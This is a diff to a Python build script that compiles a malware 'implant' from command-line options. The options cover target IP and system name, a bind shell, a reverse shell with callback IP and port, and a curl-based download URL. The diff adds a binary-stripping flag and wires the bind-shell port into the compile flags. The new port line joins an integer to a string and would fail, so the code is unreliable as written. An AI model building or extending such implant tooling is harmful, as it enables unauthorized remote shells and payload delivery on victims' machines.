@@ -26,6 +26,8 @@ parser.add_argument("-o", "--outputName", type=str, metavar='',
                     help="output filename", default="implant")
 parser.add_argument("-32", "--compile32", action="store_true",
                     help="compile for a 32bit system")
+parser.add_argument("-s", "--strip", action="store_true",
+                    help="turn stripping off")
 
 ##### Targeting #####
 parser.add_argument("-ip", "--ipAddress", type=str,
@@ -57,7 +59,7 @@ parser.add_argument("-sn", "--systemname", type=str, metavar='',
 
 ##### Attacks #####
 parser.add_argument("-atkB", "--bindShell", type=int, metavar='',
-                    help="run a bind shell on the given port, default is 1776", default=1776)
+                    help="run a bind shell on the given port", default=999999)
 parser.add_argument("-atkR", "--reverseShell", action="store_true",
                     help="run a reverse shell")
 parser.add_argument("-revip", "--reverseIP", type=str, metavar='',
@@ -100,12 +102,16 @@ if args.ipAddress != "unknown":
     cmdString.insert(1, "-D IPNUM=\"" + (args.ipAddress) + "\"")
 if args.compile32:
     cmdString.insert(1, "-m32")
+if not args.strip:
+    cmdString.insert(1, "-s")
 
 ##### Attacks #####
 if args.reverseIP != "unknown":
     cmdString.insert(1, "-D REVIP=\"" + (args.reverseIP) + "\"")
 if args.reversePort != "unknown":
     cmdString.insert(1, "-D PORT=\"" + (args.reversePort) + "\"")
+if args.bindShell != 999999:
+    cmdString.insert(1, "-D PORT=\"" + (args.bindShell) + "\"")
 if args.downloadURL != "www.example.com":
     cmdString.insert(1, "-D URL=\"" + (args.downloadURL) + "\"")
     cmdString.append("-lcurl")  # -lcurl is required to include the libcurl library
